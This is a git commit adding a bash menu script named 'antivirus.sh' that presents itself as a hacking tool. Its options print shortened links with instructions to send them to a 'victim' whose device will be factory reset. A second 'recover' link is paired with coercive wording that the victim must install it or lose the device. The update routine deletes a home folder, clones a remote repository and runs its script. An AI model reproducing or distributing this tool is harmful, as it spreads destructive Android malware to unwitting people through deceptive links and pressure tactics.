665c0fc0b46bb64121d23cae50c41a8efc6f074c
Anti-Anonytin <85870987+Anti-Anonytin@users.noreply.github.com>
2021-06-18 22:50:34 +0630

    upload by Anti-Anonytin

---
+++ antivirus.sh
@@ -0,0 +1,250 @@
+# A tool by Anti-Anonytin
+# Colours
+#-----------------
+red="\e[91m"
+rset="\e[0m"
+grn="\e[92m"
+ylo="\e[93m"
+blue="\e[94m"
+cyan="\e[96m"
+pink="\e[95m"
+#-----------------
+# scripting start
+banner(){
+vid
+echo -e '\e[93m               
+ _______ _      _________________          ________________         _______ 
+(  ___  | (    /\__   __|__   __/  |\     /\__   __(  ____ )\     /(  ____ \
+| (   ) |  \  ( |  ) (     ) (     | )   ( |  ) (  | (    )| )   ( | (    \/
+| (___) |   \ | |  | |     | |     | |   | |  | |  | (____)| |   | | (_____ 
+|  ___  | (\ \) |  | |     | |     ( (   ) )  | |  |     __) |   | (_____  )
+| (   ) | | \   |  | |     | |      \ \_/ /   | |  | (\ (  | |   | |     ) |
+| )   ( | )  \  |  | |  ___) (___    \   / ___) (__| ) \ \_| (___) /\____) |
+|/     \|/    )_)  )_(  \_______/     \_/  \_______//   \__(_______)_______)
+'
+echo " " 
+echo -e "$red                       ▶Coded by$grn AonMao$red◀$rset"
+echo -e "$red                      ⫸$ylo  Anti-Anonytin$red ⫷$rset"
+echo 
+# Functions
+echo -e "$red                    [Infect them with this]$rset"
+echo " "
+echo " "
+}
+baner1(){
+clear
+echo -e '\e[93m               
+
+ ▄▄▄·  ▐ ▄ ▄▄▄▄▄▪       ▌ ▐·▪  ▄▄▄  ▄• ▄▌.▄▄ · 
+▐█ ▀█ •█▌▐█•██  ██     ▪█·█▌██ ▀▄ █·█▪██▌▐█ ▀. 
+▄█▀▀█ ▐█▐▐▌ ▐█.▪▐█·    ▐█▐█•▐█·▐▀▀▄ █▌▐█▌▄▀▀▀█▄
+▐█ ▪▐▌██▐█▌ ▐█▌·▐█▌     ███ ▐█▌▐█•█▌▐█▄█▌▐█▄▪▐█
+ ▀  ▀ ▀▀ █▪ ▀▀▀ ▀▀▀    . ▀  ▀▀▀.▀  ▀ ▀▀▀  ▀▀▀▀ 
+               Anti-Anonytin
+'
+echo " " 
+echo -e "$red                       ▶Coded by$grn AonMao$red◀$rset"
+echo -e "$red                      ⫸$ylo  Anti-Anonytin$red ⫷$rset"
+echo 
+# Functions
+echo -e "$red                    [Infect them with this]$rset"
+echo " "
+echo " "
+}
+menu(){
+echo -e "$grn             ＞＞＞＞>>>＞$ylo [Options]$grn ＜<<<＜＜＜＜$rset"
+echo " "
+echo " "
+echo -e "$red                        ➡$cyan [\e[92m1\e[96m] Get Link"
+echo -e "$red                        ➡$cyan [\e[92m2\e[96m] Recover"
+echo -e "$red                        ➡$cyan [\e[92m3\e[96m] About"
+echo -e "$red                        ➡$cyan [\e[92m4\e[96m] Update script "
+echo -e "$red                        ➡$cyan [\e[92m5\e[96m] Exit"
+echo " "
+echo " "
+echo -e "$grn               >＞＞＞＞＞$ylo [SELECT]$grn ＜＜＜＜＜<$rset"
+echo " "
+echo -ne "\e[92m#SELECT OPTION\e[92m: "
+read optnz
+if [ $optnz = "1" ];
+then
+virus
+elif [ $optnz = "2" ];
+then
+save
+elif [ $optnz = "3" ];
+then
+about
+elif [ $optnz = "4" ];
+then
+upd
+elif [ $optnz = "5" ];
+then
+exit 1
+else
+echo "wrong"
+exit
+fi
+}
+virus(){
+################
+clear
+echo
+echo -e '\e[92m 
+ ▄▄▄·  ▐ ▄ ▄▄▄▄▄▪       ▌ ▐·▪  ▄▄▄  ▄• ▄▌.▄▄ · 
+▐█ ▀█ •█▌▐█•██  ██     ▪█·█▌██ ▀▄ █·█▪██▌▐█ ▀. 
+▄█▀▀█ ▐█▐▐▌ ▐█.▪▐█·    ▐█▐█•▐█·▐▀▀▄ █▌▐█▌▄▀▀▀█▄
+▐█ ▪▐▌██▐█▌ ▐█▌·▐█▌     ███ ▐█▌▐█•█▌▐█▄█▌▐█▄▪▐█
+ ▀  ▀ ▀▀ █▪ ▀▀▀ ▀▀▀    . ▀  ▀▀▀.▀  ▀ ▀▀▀  ▀▀▀▀ '
+echo " "
+echo -e "\e[91m 😈   Send this link to your victim. when he install it in his 
+device it will be factory reset and lot more happens.(be warning!!!)
+                                👇👇👇
+
+      \e[92mL1NK :- \e[96mhttps://bit.ly/3ild93L\e[91m
+
+                                 
+use this to be a right way,not to harm anyone.."
+echo
+echo -ne "\e[92m#Type exit : "
+read exitz
+if [ $exitz = "exit" ];
+then
+banner
+menu
+else
+banner
+menu
+fi
+}
+save(){
+clear
+echo
+echo -e '\e[92m 
+ ▄▄▄·  ▐ ▄ ▄▄▄▄▄▪       ▌ ▐·▪  ▄▄▄  ▄• ▄▌.▄▄ · 
+▐█ ▀█ •█▌▐█•██  ██     ▪█·█▌██ ▀▄ █·█▪██▌▐█ ▀. 
+▄█▀▀█ ▐█▐▐▌ ▐█.▪▐█·    ▐█▐█•▐█·▐▀▀▄ █▌▐█▌▄▀▀▀█▄
+▐█ ▪▐▌██▐█▌ ▐█▌·▐█▌     ███ ▐█▌▐█•█▌▐█▄█▌▐█▄▪▐█
+ ▀  ▀ ▀▀ █▪ ▀▀▀ ▀▀▀    . ▀  ▀▀▀.▀  ▀ ▀▀▀  ▀▀▀▀ '
+echo " "
+echo " "
+echo -e "\e[93m  To recover all data that happened,send this link to your victim and tell him
+to install this application or else his 
+device will not be recovered.(Antivirus)
+                    👇👇👇
+
+     \e[92mL1NK :- \e[96mhttps://bit.ly/3fX8ljZ\e[93m
+
+                    
+use this to be a right way,not to harm anyone.."
+echo
+echo -ne "\e[92m#Type exit : "
+read exitz
+if [ $exitz = "exit" ];
+then
+banner
+menu
+else
+banner
+menu
+fi
+}
+about(){
+clear
+echo -e '\e[91m
+ ▄▄▄·  ▐ ▄ ▄▄▄▄▄▪       ▌ ▐·▪  ▄▄▄  ▄• ▄▌.▄▄ · 
+▐█ ▀█ •█▌▐█•██  ██     ▪█·█▌██ ▀▄ █·█▪██▌▐█ ▀. 
+▄█▀▀█ ▐█▐▐▌ ▐█.▪▐█·    ▐█▐█•▐█·▐▀▀▄ █▌▐█▌▄▀▀▀█▄
+▐█ ▪▐▌██▐█▌ ▐█▌·▐█▌     ███ ▐█▌▐█•█▌▐█▄█▌▐█▄▪▐█
+ ▀  ▀ ▀▀ █▪ ▀▀▀ ▀▀▀    . ▀  ▀▀▀.▀  ▀ ▀▀▀  ▀▀▀▀ 
+'
+echo -e "\e[93m                  CALL ME \e[92mAonMao" | pv -qL 10
+echo -e "\e[93m             IAM FROM \e[92mAnti-Anonytin" | pv -qL 10
+echo -e "\e[93m       IM A \e[92mGEEK\e[93m WITH LOTS OF EXCITEMENT" | pv -qL 10
+echo -e "\e[93m             HOPE YOU LIKE THIS SCRIPT" | pv -qL 10
+echo -e "\e[93m         OOPS... I TALK A LOT SRY FOR THAT " | pv -qL 10
+echo -e "\e[92m                BYEE.............." | pv -qL 10
+sleep 6.0
+banner
+menu
+}
+upd(){
+if [ -d "$HOME/infect" ];
+then
+cd $HOME
+rm -rf infect
+elif [ -d "$HOME/Infect" ];
+then
+cd $HOME
+rm -rf Infect
+else
+echo
+exit 1
+fi
+cd $HOME
+sleep 1
+echo -e "         \e[96mUPDATE IS GOING ON, PLEASE WAIT FOR A WHILE...!\e[0m"
+echo
+printf "                     \e[96m["
+# While process is running...
+while git clone https://github.com/noob-hackers/infect 2> /dev/null; do 
+    printf  "\e[92m▓▓▓▓▓▓▓▓▓▓▓▓▓\e[0m"
+    sleep 1
+done
+printf "\e[96m]\e[0m"
+echo
+echo
+echo
+printf "\e[96m           UPDATE SUCCESSFULL (LATEST VERSION)..!\e[0m"
+sleep 2.0
+cd $HOME
+cd infect
+bash infect.sh
+}
+vid(){
+FILE=$HOME/infect/noob.noob
+if [ -f "$FILE" ]; then
+pop
+else
+echo
+fi
+}
+pop(){
+clear
+echo -e "\e[96m                ╔═══════════════════════════════════╗\e[0m"
+echo -e "\e[96m                ║  \e[93mHAI, I JUST UPLOADED NEW\e[96m VIDEO   ║\e[0m"
+echo -e "\e[96m                ║      WATCH NEW VIDEO NOW.....!    ║\e[0m"
+echo -e "\e[96m                ║                                   ║\e[0m"
+echo -e "\e[96m                ║        Select \e[92my\e[96m to watch\e[96m          ║\e[0m"
+echo -e "\e[96m                ║                (\e[93mOR\e[96m)               \e[96m║\e[0m"
+echo -e "\e[96m                ║        Select \e[91mt\e[96m to cancel\e[96m         ║\e[0m"
+echo -e "\e[96m                ║                (\e[93mOR\e[96m)               \e[96m║\e[0m"
+echo -e "\e[96m                ║     Select \e[91mz\e[96m to skipforever\e[96m       ║\e[0m"
+echo -e "\e[96m                ╚═══════════════════════════════════╝\e[0m"
+echo -en "\e[32mSELECT OPTION [\e[93my/\e[93mt/\e[32m\e[93mz\e[32m]: \e[0m "
+read p
+if [ "$p" = "y" ];
+then
+am start -a android.intent.action.VIEW -d https://noobhacktube.com 2>/dev/null
+clear
+baner1
+menu
+elif [ "$p" = "t" ];
+then
+clear
+baner1
+menu
+elif [ "$p" = "z" ];
+then
+cd $HOM/infect
+rm noob.noob
+banner
+menu
+else
+banner
+menu
+exit
+fi
+}
+banner
+menu
